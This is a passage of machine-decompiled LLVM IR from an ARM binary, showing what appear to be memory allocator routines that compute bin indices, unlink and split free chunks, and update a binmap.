  store i32 %v3_10fc0, i32* %r1.global-to-local, align 4
  %v2_10fc4 = icmp ugt i32 %arg1, 16777215
  store i32 %arg1, i32* %ip.global-to-local, align 4
  br i1 %v2_10fc4, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_10fc0
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_10fc0, %bb
  %v0_10fd0 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10fc4, i32 %v0_10fd0)
  %v0_10fd4 = load i32, i32* %r1.global-to-local, align 4
  %v1_10fd4 = add i32 %v0_10fd4, 1048320
  %v3_10fd8 = udiv i32 %v1_10fd4, 65536
  %v1_10fdc = and i32 %v3_10fd8, 8
  %v6_10fe0 = shl i32 %v0_10fd4, %v1_10fdc
  %v1_10fe4 = add i32 %v6_10fe0, 520192
  %v3_10fe8 = udiv i32 %v1_10fe4, 65536
  %v1_10fec = and i32 %v3_10fe8, 4
  %v6_10ff0 = shl i32 %v6_10fe0, %v1_10fec
  %v1_10ff4 = add i32 %v6_10ff0, 245760
  %v3_10ff8 = udiv i32 %v1_10ff4, 65536
  %v1_10ffc = and i32 %v3_10ff8, 2
  %v6_11000 = shl i32 %v6_10ff0, %v1_10ffc
  store i32 %v6_11000, i32* %r1.global-to-local, align 4
  %v1_11004 = sub nsw i32 13, %v1_10fdc
  %v2_11008 = sub nsw i32 %v1_11004, %v1_10fec
  %v3_1100c = udiv i32 %v6_11000, 32768
  %v4_1100c = sub nuw nsw i32 -1, %v3_1100c
  %v4_11010 = udiv i32 %v6_11000, 16384
  %v5_11010 = and i32 %v4_11010, %v4_1100c
  %v2_11014 = sub nsw i32 %v2_11008, %v1_10ffc
  %v2_11018 = add nsw i32 %v2_11014, %v5_11010
  %v1_1101c = add nsw i32 %v2_11018, 6
  %v0_11020 = load i32, i32* %ip.global-to-local, align 4
  %v6_11020 = lshr i32 %v0_11020, %v1_1101c
  %v3_11024 = mul nsw i32 %v2_11018, 4
  %v1_11028 = add nsw i32 %v3_11024, 32
  %v1_1102c = urem i32 %v6_11020, 4
  %v2_11030 = or i32 %v1_1102c, %v1_11028
  ret i32 %v2_11030

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_11038() local_unnamed_addr {
dec_label_pc_11038:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_11038 = load i32, i32* @r4, align 4
  %v6_11038 = load i32, i32* @r5, align 4
  %v9_11038 = load i32, i32* @r6, align 4
  %v12_11038 = load i32, i32* @r7, align 4
  %v15_11038 = load i32, i32* @r8, align 4
  %v18_11038 = load i32, i32* @sb, align 4
  %v21_11038 = load i32, i32* @sl, align 4
  %v24_11038 = load i32, i32* @fp, align 4
  %v27_11038 = load i32, i32* @lr, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  store i32 123764, i32* %r1.global-to-local, align 4
  %v4_1104c = load i32, i32* inttoptr (i32 123832 to i32*), align 8
  store i32 %v4_1104c, i32* %r4.global-to-local, align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_11058 = load i32, i32* inttoptr (i32 123800 to i32*), align 8
  store i32 %v4_11058, i32* %r1.global-to-local, align 4
  %v0_1105c = load i32, i32* @r0, align 4
  store i32 %v0_1105c, i32* @r5, align 4
  store i32 %v4_1104c, i32* %r2.global-to-local, align 4
  %v2_11064 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_11064, i32* %r0.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  store i32 123764, i32* %ip.global-to-local, align 4
  %v4_11070 = load i32, i32* inttoptr (i32 123836 to i32*), align 4
  store i32 %v4_11070, i32* %ip.global-to-local, align 4
  store i32 69756, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11070)
  %v0_1107c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1107c, i32* %r0.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 123764, i32* %r1.global-to-local, align 4
  %v4_11088 = load i32, i32* inttoptr (i32 123780 to i32*), align 4
  store i32 %v4_11088, i32* @ip, align 4
  store i32 ptrtoint (i32* @global_var_11094.390 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_11088)
  %v0_11094 = load i32, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_11094, -32
  br i1 %tmp, label %dec_label_pc_110b0, label %dec_label_pc_1109c

dec_label_pc_1109c:                               ; preds = %dec_label_pc_11038
  %v0_1109c = call i32 @function_10a30()
  store i32 %v0_1109c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 12, i32* @r3, align 4
  %v2_110a8 = inttoptr i32 %v0_1109c to i32*
  store i32 12, i32* %v2_110a8, align 4
  br label %dec_label_pc_1192c

dec_label_pc_110b0:                               ; preds = %dec_label_pc_11038
  %v1_110b0 = add i32 %v0_11094, 11
  store i32 %v1_110b0, i32* %r0.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 123764, i32* %r2.global-to-local, align 4
  %v2_110bc = icmp ugt i32 %v1_110b0, 14
  %v7_110bc = icmp eq i32 %v1_110b0, 15
  %v2_110c0 = xor i1 %v7_110bc, true
  %v3_110c0 = and i1 %v2_110bc, %v2_110c0
  br i1 %v3_110c0, label %bb, label %bb138

bb:                                               ; preds = %dec_label_pc_110b0
  %v5_110c0 = and i32 %v1_110b0, -8
  store i32 %v5_110c0, i32* @sl, align 4
  br label %bb138

bb138:                                            ; preds = %dec_label_pc_110b0, %bb
  %v4_110c4 = load i32, i32* inttoptr (i32 123796 to i32*), align 4
  store i32 %v4_110c4, i32* @r0, align 4
  %v1_110c8 = inttoptr i32 %v4_110c4 to i32*
  %v2_110c8 = load i32, i32* %v1_110c8, align 4
  store i32 %v2_110c8, i32* @r4, align 4
  %v2_110cc = xor i1 %v2_110bc, true
  %v3_110cc = or i1 %v7_110bc, %v2_110cc
  br i1 %v3_110cc, label %bb139, label %bb140

bb139:                                            ; preds = %bb138
  store i32 16, i32* @sl, align 4
  br label %bb140

bb140:                                            ; preds = %bb138, %bb139
  %v1_110d0 = urem i32 %v2_110c8, 2
  %v2_110d0 = icmp eq i32 %v1_110d0, 0
  br i1 %v2_110d0, label %dec_label_pc_110d8, label %dec_label_pc_110e8

dec_label_pc_110d8:                               ; preds = %bb140
  %v2_110d8 = icmp eq i32 %v2_110c8, 0
  br i1 %v2_110d8, label %dec_label_pc_110e0, label %dec_label_pc_114c4

dec_label_pc_110e0:                               ; preds = %dec_label_pc_110d8
  %v0_110e0 = call i32 @function_11ef0()
  store i32 %v0_110e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_114c4

dec_label_pc_110e8:                               ; preds = %bb140
  %v0_110e8 = load i32, i32* @sl, align 4
  %tmp201 = icmp ugt i32 %v0_110e8, %v2_110c8
  br i1 %tmp201, label %dec_label_pc_11110, label %dec_label_pc_110f0

dec_label_pc_110f0:                               ; preds = %dec_label_pc_110e8
  %v1_110f0 = add i32 %v4_110c4, -4
  store i32 %v1_110f0, i32* %r1.global-to-local, align 4
  %v3_110f4 = udiv i32 %v0_110e8, 8
  store i32 %v3_110f4, i32* %r2.global-to-local, align 4
  %v4_110f8 = mul nuw i32 %v3_110f4, 4
  %v5_110f8 = add i32 %v4_110f8, %v1_110f0
  %v6_110f8 = inttoptr i32 %v5_110f8 to i32*
  %v7_110f8 = load i32, i32* %v6_110f8, align 4
  store i32 %v7_110f8, i32* %r0.global-to-local, align 4
  %v2_110fc = icmp eq i32 %v7_110f8, 0
  br i1 %v2_110fc, label %dec_label_pc_11110, label %.thread1

.thread1:                                         ; preds = %dec_label_pc_110f0
  %v2_11100 = add i32 %v7_110f8, 8
  %v3_11100 = inttoptr i32 %v2_11100 to i32*
  %v4_11100 = load i32, i32* %v3_11100, align 4
  store i32 %v4_11100, i32* %r3.global-to-local, align 4
  store i32 %v2_11100, i32* %r0.global-to-local, align 4
  store i32 %v2_11100, i32* %r4.global-to-local, align 4
  store i32 %v4_11100, i32* %v6_110f8, align 4
  br label %dec_label_pc_11910

dec_label_pc_11110:                               ; preds = %dec_label_pc_110f0, %dec_label_pc_110e8
  %tmp202 = icmp ugt i32 %v0_110e8, 255
  br i1 %tmp202, label %dec_label_pc_11160, label %dec_label_pc_11118

dec_label_pc_11118:                               ; preds = %dec_label_pc_11110
  store i32 123764, i32* %ip.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_11120 = load i32, i32* inttoptr (i32 123796 to i32*), align 4
  %v3_11124 = udiv i32 %v0_110e8, 8
  store i32 %v3_11124, i32* @r7, align 4
  %v4_11128 = mul nuw i32 %v3_11124, 8
  %v5_11128 = add i32 %v4_11120, %v4_11128
  store i32 %v5_11128, i32* %r3.global-to-local, align 4
  %v1_1112c = add i32 %v5_11128, 44
  store i32 %v1_1112c, i32* %ip.global-to-local, align 4
  %v1_11130 = add i32 %v5_11128, 56
  %v2_11130 = inttoptr i32 %v1_11130 to i32*
  %v3_11130 = load i32, i32* %v2_11130, align 4
  store i32 %v3_11130, i32* %r0.global-to-local, align 4
  %v9_11134 = icmp eq i32 %v3_11130, %v1_1112c
  br i1 %v9_11134, label %dec_label_pc_112c0, label %dec_label_pc_1113c

dec_label_pc_1113c:                               ; preds = %dec_label_pc_11118
  %v2_1113c = add i32 %v3_11130, %v0_110e8
  store i32 %v2_1113c, i32* %r3.global-to-local, align 4
  %v1_11140 = add i32 %v2_1113c, 4
  %v2_11140 = inttoptr i32 %v1_11140 to i32*
  %v3_11140 = load i32, i32* %v2_11140, align 4
  store i32 %v3_11140, i32* %r2.global-to-local, align 4
  %v1_11144 = add i32 %v3_11130, 12
  %v2_11144 = inttoptr i32 %v1_11144 to i32*
  %v3_11144 = load i32, i32* %v2_11144, align 4
  store i32 %v3_11144, i32* %r1.global-to-local, align 4
  %v1_11148 = or i32 %v3_11140, 1
  store i32 %v1_11148, i32* %r2.global-to-local, align 4
  %v1_1114c = add i32 %v3_11130, 8
  store i32 %v1_1114c, i32* %r4.global-to-local, align 4
  store i32 %v1_11148, i32* %v2_11140, align 4
  %v0_11154 = load i32, i32* %ip.global-to-local, align 4
  %v1_11154 = load i32, i32* %r1.global-to-local, align 4
  %v2_11154 = add i32 %v1_11154, 8
  %v3_11154 = inttoptr i32 %v2_11154 to i32*
  store i32 %v0_11154, i32* %v3_11154, align 4
  %v0_11158 = load i32, i32* %r1.global-to-local, align 4
  %v1_11158 = load i32, i32* %ip.global-to-local, align 4
  %v2_11158 = add i32 %v1_11158, 12
  %v3_11158 = inttoptr i32 %v2_11158 to i32*
  store i32 %v0_11158, i32* %v3_11158, align 4
  br label %dec_label_pc_11910

dec_label_pc_11160:                               ; preds = %dec_label_pc_11110
  store i32 %v0_110e8, i32* %r0.global-to-local, align 4
  %v1_11164 = call i32 @function_10fc0(i32 %v0_110e8)
  store i32 %v1_11164, i32* %r0.global-to-local, align 4
  %v0_11168 = load i32, i32* @r4, align 4
  %v1_11168 = and i32 %v0_11168, 2
  %v2_11168 = icmp eq i32 %v1_11168, 0
  store i32 %v1_11164, i32* @r7, align 4
  br i1 %v2_11168, label %dec_label_pc_112c0, label %dec_label_pc_11174

dec_label_pc_11174:                               ; preds = %dec_label_pc_11160
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 123764, i32* %r1.global-to-local, align 4
  %v4_1117c = load i32, i32* inttoptr (i32 123796 to i32*), align 4
  store i32 %v4_1117c, i32* @r0, align 4
  %v0_11180 = call i32 @function_11ef0()
  store i32 %v0_11180, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_112c0

dec_label_pc_11188:                               ; preds = %dec_label_pc_112d4
  %v1_11188 = add i32 %v3_112d4, 4
  %v2_11188 = inttoptr i32 %v1_11188 to i32*
  %v3_11188 = load i32, i32* %v2_11188, align 4
  store i32 %v3_11188, i32* %r3.global-to-local, align 4
  %v0_1118c = load i32, i32* @sl, align 4
  %v1_11190 = and i32 %v3_11188, -4
  store i32 %v1_11190, i32* %r4.global-to-local, align 4
  %v1_11194 = add i32 %v3_112d4, 12
  %v2_11194 = inttoptr i32 %v1_11194 to i32*
  %v3_11194 = load i32, i32* %v2_11194, align 4
  store i32 %v3_11194, i32* %ip.global-to-local, align 4
  %tmp203 = icmp ugt i32 %v0_1118c, 255
  br i1 %tmp203, label %dec_label_pc_111f0, label %dec_label_pc_1119c

dec_label_pc_1119c:                               ; preds = %dec_label_pc_11188
  %v9_1119c = icmp eq i32 %v3_11194, %v0_111f4
  br i1 %v9_1119c, label %dec_label_pc_111a4, label %dec_label_pc_111f0

dec_label_pc_111a4:                               ; preds = %dec_label_pc_1119c
  %v0_111a4 = load i32, i32* @sb, align 4
  %v1_111a4 = add i32 %v0_111a4, 48
  %v2_111a4 = inttoptr i32 %v1_111a4 to i32*
  %v3_111a4 = load i32, i32* %v2_111a4, align 4
  store i32 %v3_111a4, i32* %r3.global-to-local, align 4
  %v9_111a8 = icmp eq i32 %v3_112d4, %v3_111a4
  br i1 %v9_111a8, label %dec_label_pc_111b0, label %dec_label_pc_111f0

dec_label_pc_111b0:                               ; preds = %dec_label_pc_111a4
  %v1_111b0 = load i32, i32* @fp, align 4
  %tmp204 = icmp ugt i32 %v1_11190, %v1_111b0
  br i1 %tmp204, label %dec_label_pc_111b8, label %dec_label_pc_111f0

dec_label_pc_111b8:                               ; preds = %dec_label_pc_111b0
  %v2_111b8 = sub i32 %v1_11190, %v0_1118c
  store i32 %v2_111b8, i32* %r2.global-to-local, align 4
  %v2_111bc = add i32 %v0_1118c, %v3_112d4
  store i32 %v2_111bc, i32* %r3.global-to-local, align 4
  %v1_111c0 = or i32 %v0_1118c, 1
  store i32 %v1_111c0, i32* %r0.global-to-local, align 4
  %v1_111c4 = or i32 %v2_111b8, 1
  store i32 %v1_111c4, i32* %r1.global-to-local, align 4
  %v1_111c8 = add i32 %v3_112d4, 8
  store i32 %v1_111c8, i32* %r4.global-to-local, align 4
  %v2_111cc = add i32 %v0_111f4, 8
  %v3_111cc = inttoptr i32 %v2_111cc to i32*
  store i32 %v2_111bc, i32* %v3_111cc, align 4
  %v0_111d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_111d0 = load i32, i32* %ip.global-to-local, align 4
  %v2_111d0 = add i32 %v1_111d0, 12
  %v3_111d0 = inttoptr i32 %v2_111d0 to i32*
  store i32 %v0_111d0, i32* %v3_111d0, align 4
  %v0_111d4 = load i32, i32* %r0.global-to-local, align 4
  %v1_111d4 = load i32, i32* @r6, align 4
  %v2_111d4 = add i32 %v1_111d4, 4
  %v3_111d4 = inttoptr i32 %v2_111d4 to i32*
  store i32 %v0_111d4, i32* %v3_111d4, align 4
  %v0_111d8 = load i32, i32* %r3.global-to-local, align 4
  %v1_111d8 = load i32, i32* @sb, align 4
  %v2_111d8 = add i32 %v1_111d8, 48
  %v3_111d8 = inttoptr i32 %v2_111d8 to i32*
  store i32 %v0_111d8, i32* %v3_111d8, align 4
  %v0_111dc = load i32, i32* %r2.global-to-local, align 4
  %v1_111dc = load i32, i32* %r3.global-to-local, align 4
  %v3_111dc = add i32 %v1_111dc, %v0_111dc
  %v4_111dc = inttoptr i32 %v3_111dc to i32*
  store i32 %v0_111dc, i32* %v4_111dc, align 4
  %v0_111e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_111e0 = load i32, i32* %r3.global-to-local, align 4
  %v2_111e0 = add i32 %v1_111e0, 4
  %v3_111e0 = inttoptr i32 %v2_111e0 to i32*
  store i32 %v0_111e0, i32* %v3_111e0, align 4
  %v0_111e4 = load i32, i32* %ip.global-to-local, align 4
  %v1_111e4 = load i32, i32* %r3.global-to-local, align 4
  %v2_111e4 = add i32 %v1_111e4, 12
  %v3_111e4 = inttoptr i32 %v2_111e4 to i32*
  store i32 %v0_111e4, i32* %v3_111e4, align 4
  %v0_111e8 = load i32, i32* %ip.global-to-local, align 4
  %v1_111e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_111e8 = add i32 %v1_111e8, 8
  %v3_111e8 = inttoptr i32 %v2_111e8 to i32*
  store i32 %v0_111e8, i32* %v3_111e8, align 4
  br label %dec_label_pc_11910

dec_label_pc_111f0:                               ; preds = %dec_label_pc_111b0, %dec_label_pc_111a4, %dec_label_pc_1119c, %dec_label_pc_11188
  %v9_111f0 = icmp eq i32 %v1_11190, %v0_1118c
  %v2_111f4 = add i32 %v3_11194, 8
  %v3_111f4 = inttoptr i32 %v2_111f4 to i32*
  store i32 %v0_111f4, i32* %v3_111f4, align 4
  %v0_111f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_111f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_111f8 = add i32 %v1_111f8, 12
  %v3_111f8 = inttoptr i32 %v2_111f8 to i32*
  store i32 %v0_111f8, i32* %v3_111f8, align 4
  br i1 %v9_111f0, label %dec_label_pc_11350.loopexit, label %dec_label_pc_1120c

dec_label_pc_1120c:                               ; preds = %dec_label_pc_111f0
  %v0_1120c = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_1120c, 255
  br i1 %tmp205, label %dec_label_pc_11230, label %dec_label_pc_11214

dec_label_pc_11214:                               ; preds = %dec_label_pc_1120c
  store i32 123764, i32* %r2.global-to-local, align 4
  %v1_11218 = load i32, i32* %r8.global-to-local, align 4
  %v2_11218 = add i32 %v1_11218, 123764
  %v3_11218 = inttoptr i32 %v2_11218 to i32*
  %v4_11218 = load i32, i32* %v3_11218, align 4
  %v3_1121c = udiv i32 %v0_1120c, 8
  store i32 %v3_1121c, i32* %r0.global-to-local, align 4
  %v4_11220 = mul nuw i32 %v3_1121c, 8
  %v5_11220 = add i32 %v4_11218, %v4_11220
  store i32 %v5_11220, i32* %r3.global-to-local, align 4
  %v1_11224 = add i32 %v5_11220, 44
  store i32 %v1_11224, i32* %ip.global-to-local, align 4
  %v1_11228 = add i32 %v5_11220, 52
  %v2_11228 = inttoptr i32 %v1_11228 to i32*
  %v3_11228 = load i32, i32* %v2_11228, align 4
  store i32 %v3_11228, i32* @lr, align 4
  br label %dec_label_pc_11288

dec_label_pc_11230:                               ; preds = %dec_label_pc_1120c
  store i32 %v0_1120c, i32* %r0.global-to-local, align 4
  %v1_11234 = call i32 @function_10fc0(i32 %v0_1120c)
  store i32 %v1_11234, i32* %r0.global-to-local, align 4
  store i32 123764, i32* %ip.global-to-local, align 4
  %v1_1123c = load i32, i32* %r8.global-to-local, align 4
  %v2_1123c = add i32 %v1_1123c, 123764
  %v3_1123c = inttoptr i32 %v2_1123c to i32*
  %v4_1123c = load i32, i32* %v3_1123c, align 4
  %v4_11240 = mul i32 %v1_11234, 8
  %v5_11240 = add i32 %v4_1123c, %v4_11240
  store i32 %v5_11240, i32* %r3.global-to-local, align 4
  %v1_11244 = add i32 %v5_11240, 44
  store i32 %v1_11244, i32* %ip.global-to-local, align 4
  %v1_11248 = add i32 %v5_11240, 52
  %v2_11248 = inttoptr i32 %v1_11248 to i32*
  %v3_11248 = load i32, i32* %v2_11248, align 4
  store i32 %v3_11248, i32* @lr, align 4
  %v9_1124c = icmp eq i32 %v3_11248, %v1_11244
  br i1 %v9_1124c, label %dec_label_pc_11288, label %dec_label_pc_11254

dec_label_pc_11254:                               ; preds = %dec_label_pc_11230
  %v1_11254 = add i32 %v5_11240, 56
  %v2_11254 = inttoptr i32 %v1_11254 to i32*
  %v3_11254 = load i32, i32* %v2_11254, align 4
  store i32 %v3_11254, i32* %r1.global-to-local, align 4
  %v1_11258 = add i32 %v3_11254, 4
  %v2_11258 = inttoptr i32 %v1_11258 to i32*
  %v3_11258 = load i32, i32* %v2_11258, align 4
  store i32 %v3_11258, i32* %r3.global-to-local, align 4
  %v0_1125c = load i32, i32* %r4.global-to-local, align 4
  %v3_1125c = icmp ult i32 %v0_1125c, %v3_11258
  br i1 %v3_1125c, label %.thread, label %dec_label_pc_11278.preheader

.thread:                                          ; preds = %dec_label_pc_11254
  store i32 %v1_11244, i32* @lr, align 4
  store i32 %v3_11254, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11288

dec_label_pc_11278.preheader:                     ; preds = %dec_label_pc_11254
  %v2_11264 = or i32 %v0_1125c, 1
  store i32 %v2_11264, i32* %r2.global-to-local, align 4
  %v1_11278179 = add i32 %v3_11248, 4
  %v2_11278180 = inttoptr i32 %v1_11278179 to i32*
  %v3_11278181 = load i32, i32* %v2_11278180, align 4
  store i32 %v3_11278181, i32* %r3.global-to-local, align 4
  %v3_1127c183 = icmp ult i32 %v2_11264, %v3_11278181
  br i1 %v3_1127c183, label %dec_label_pc_11274, label %dec_label_pc_11284

dec_label_pc_11274:                               ; preds = %dec_label_pc_11278.preheader, %dec_label_pc_11274
  %v0_11284184 = phi i32 [ %v3_11274, %dec_label_pc_11274 ], [ %v3_11248, %dec_label_pc_11278.preheader ]
  %v1_11274 = add i32 %v0_11284184, 8
  %v2_11274 = inttoptr i32 %v1_11274 to i32*
  %v3_11274 = load i32, i32* %v2_11274, align 4
  store i32 %v3_11274, i32* @lr, align 4
  %v1_11278 = add i32 %v3_11274, 4
  %v2_11278 = inttoptr i32 %v1_11278 to i32*
  %v3_11278 = load i32, i32* %v2_11278, align 4
  store i32 %v3_11278, i32* %r3.global-to-local, align 4
  %v3_1127c = icmp ult i32 %v2_11264, %v3_11278
  br i1 %v3_1127c, label %dec_label_pc_11274, label %dec_label_pc_11284

dec_label_pc_11284:                               ; preds = %dec_label_pc_11274, %dec_label_pc_11278.preheader
  %v0_11284.lcssa = phi i32 [ %v3_11248, %dec_label_pc_11278.preheader ], [ %v3_11274, %dec_label_pc_11274 ]
  %v1_11284 = add i32 %v0_11284.lcssa, 12
  %v2_11284 = inttoptr i32 %v1_11284 to i32*
  %v3_11284 = load i32, i32* %v2_11284, align 4
  store i32 %v3_11284, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11288

dec_label_pc_11288:                               ; preds = %.thread, %dec_label_pc_11230, %dec_label_pc_11214, %dec_label_pc_11284
  %v0_112a8 = phi i32 [ %v1_11244, %dec_label_pc_11230 ], [ %v1_11224, %dec_label_pc_11214 ], [ %v3_11284, %dec_label_pc_11284 ], [ %v3_11254, %.thread ]
  %v0_1129c = phi i32 [ %v1_11234, %dec_label_pc_11230 ], [ %v3_1121c, %dec_label_pc_11214 ], [ %v1_11234, %dec_label_pc_11284 ], [ %v1_11234, %.thread ]
  %v1_1128c = phi i32 [ %v1_1123c, %dec_label_pc_11230 ], [ %v1_11218, %dec_label_pc_11214 ], [ %v1_1123c, %dec_label_pc_11284 ], [ %v1_1123c, %.thread ]
  store i32 123764, i32* %r2.global-to-local, align 4
  %v2_1128c = add i32 %v1_1128c, 123764
  %v3_1128c = inttoptr i32 %v2_1128c to i32*
  %v4_1128c = load i32, i32* %v3_1128c, align 4
  %v3_11290 = sdiv i32 %v0_1129c, 32
  store i32 %v3_11290, i32* %r3.global-to-local, align 4
  %v4_11294 = mul nsw i32 %v3_11290, 4
  %v5_11294 = add i32 %v4_1128c, %v4_11294
  store i32 %v5_11294, i32* %r1.global-to-local, align 4
  %v1_11298 = add i32 %v5_11294, 820
  %v2_11298 = inttoptr i32 %v1_11298 to i32*
  %v3_11298 = load i32, i32* %v2_11298, align 4
  %v1_1129c = urem i32 %v0_1129c, 32
  store i32 %v1_1129c, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_112a4 = shl i32 1, %v1_1129c
  %v8_112a4 = or i32 %v3_11298, %v7_112a4
  store i32 %v8_112a4, i32* %r3.global-to-local, align 4
  %v1_112a8 = load i32, i32* @r6, align 4
  %v2_112a8 = add i32 %v1_112a8, 12
  %v3_112a8 = inttoptr i32 %v2_112a8 to i32*
  store i32 %v0_112a8, i32* %v3_112a8, align 4
  %v0_112ac = load i32, i32* @lr, align 4
  %v1_112ac = load i32, i32* @r6, align 4
  %v2_112ac = add i32 %v1_112ac, 8
  %v3_112ac = inttoptr i32 %v2_112ac to i32*
  store i32 %v0_112ac, i32* %v3_112ac, align 4
  %v0_112b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_112b0 = load i32, i32* %r1.global-to-local, align 4
  %v2_112b0 = add i32 %v1_112b0, 820
  %v3_112b0 = inttoptr i32 %v2_112b0 to i32*
  store i32 %v0_112b0, i32* %v3_112b0, align 4
  %v0_112b4 = load i32, i32* @r6, align 4
  %v1_112b4 = load i32, i32* @lr, align 4
  %v2_112b4 = add i32 %v1_112b4, 12
  %v3_112b4 = inttoptr i32 %v2_112b4 to i32*
  store i32 %v0_112b4, i32* %v3_112b4, align 4
  %v0_112b8 = load i32, i32* @r6, align 4
  %v1_112b8 = load i32, i32* %ip.global-to-local, align 4
  %v2_112b8 = add i32 %v1_112b8, 8
  %v3_112b8 = inttoptr i32 %v2_112b8 to i32*
  store i32 %v0_112b8, i32* %v3_112b8, align 4
  %v0_112d4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_112d4

dec_label_pc_112c0:                               ; preds = %dec_label_pc_11160, %dec_label_pc_11118, %dec_label_pc_11174
  store i32 32, i32* %r8.global-to-local, align 4
  store i32 123764, i32* %r1.global-to-local, align 4
  %v4_112c8 = load i32, i32* inttoptr (i32 123796 to i32*), align 4
  store i32 %v4_112c8, i32* @sb, align 4
  %v0_112cc = load i32, i32* @sl, align 4
  %v1_112cc = add i32 %v0_112cc, 16
  store i32 %v1_112cc, i32* @fp, align 4
  %v1_112d0 = add i32 %v4_112c8, 52
  store i32 %v1_112d0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_112d4

dec_label_pc_112d4:                               ; preds = %dec_label_pc_11288, %dec_label_pc_112c0
  %v0_111f4 = phi i32 [ %v0_112d4.pre, %dec_label_pc_11288 ], [ %v1_112d0, %dec_label_pc_112c0 ]
  %v1_112d4 = add i32 %v0_111f4, 12
  %v2_112d4 = inttoptr i32 %v1_112d4 to i32*
  %v3_112d4 = load i32, i32* %v2_112d4, align 4
  store i32 %v3_112d4, i32* @r6, align 4
  %v9_112d8 = icmp eq i32 %v3_112d4, %v0_111f4
  br i1 %v9_112d8, label %dec_label_pc_112e0, label %dec_label_pc_11188

dec_label_pc_112e0:                               ; preds = %dec_label_pc_112d4
  %v0_112e0 = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_112e0, 256
  %v0_11398.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_112e0.dec_label_pc_11398_crit_edge, label %dec_label_pc_112e8

dec_label_pc_112e0.dec_label_pc_11398_crit_edge:  ; preds = %dec_label_pc_112e0
  %.pre200 = mul i32 %v0_11398.pre, 8
  br label %dec_label_pc_11398

dec_label_pc_112e8:                               ; preds = %dec_label_pc_112e0
  %v4_112e8 = mul i32 %v0_11398.pre, 8
  %v5_112e8 = add i32 %v4_112e8, %v0_111f4
  store i32 %v5_112e8, i32* %r3.global-to-local, align 4
  %v1_112ec = add i32 %v5_112e8, -8
  store i32 %v1_112ec, i32* %r1.global-to-local, align 4
  %v1_112f0 = add i32 %v5_112e8, 4
  %v2_112f0 = inttoptr i32 %v1_112f0 to i32*
  %storemerge.pre = load i32, i32* %v2_112f0, align 4
  br label %dec_label_pc_11390

dec_label_pc_112f8:                               ; preds = %dec_label_pc_11390
  %v1_112f8 = add i32 %v1_11320, 4
  %v2_112f8 = inttoptr i32 %v1_112f8 to i32*
  %v3_112f8 = load i32, i32* %v2_112f8, align 4
  store i32 %v3_112f8, i32* %r3.global-to-local, align 4
  %v1_112fc = and i32 %v3_112f8, -4
  store i32 %v1_112fc, i32* %r2.global-to-local, align 4
  %v3_11300 = icmp ult i32 %v1_112fc, %v0_112e0
  %v1_11304 = add i32 %v1_11320, 12
  %v2_11304 = inttoptr i32 %v1_11304 to i32*
  %v3_11304 = load i32, i32* %v2_11304, align 4
  store i32 %v3_11304, i32* %r0.global-to-local, align 4
  br i1 %v3_11300, label %dec_label_pc_11390, label %dec_label_pc_1130c

dec_label_pc_1130c:                               ; preds = %dec_label_pc_112f8
  %v1_1130c = add i32 %v1_11320, 8
  %v2_1130c = inttoptr i32 %v1_1130c to i32*
  %v3_1130c = load i32, i32* %v2_1130c, align 4
  store i32 %v3_1130c, i32* %r1.global-to-local, align 4
  %v1_11310 = add i32 %v3_1130c, 12
  %v2_11310 = inttoptr i32 %v1_11310 to i32*
  %v3_11310 = load i32, i32* %v2_11310, align 4
  store i32 %v3_11310, i32* %r3.global-to-local, align 4
  %v9_11314 = icmp eq i32 %v3_11310, %v1_11320
  br i1 %v9_11314, label %dec_label_pc_1131c, label %dec_label_pc_11328

dec_label_pc_1131c:                               ; preds = %dec_label_pc_1130c
  %v1_1131c = add i32 %v3_11304, 8
  %v2_1131c = inttoptr i32 %v1_1131c to i32*
  %v3_1131c = load i32, i32* %v2_1131c, align 4
  store i32 %v3_1131c, i32* %r3.global-to-local, align 4
  %v9_11320 = icmp eq i32 %v3_1131c, %v1_11320
  br i1 %v9_11320, label %dec_label_pc_1132c, label %dec_label_pc_11328

dec_label_pc_11328:                               ; preds = %dec_label_pc_1130c, %dec_label_pc_1131c
  %v0_11328 = call i32 @function_12320()
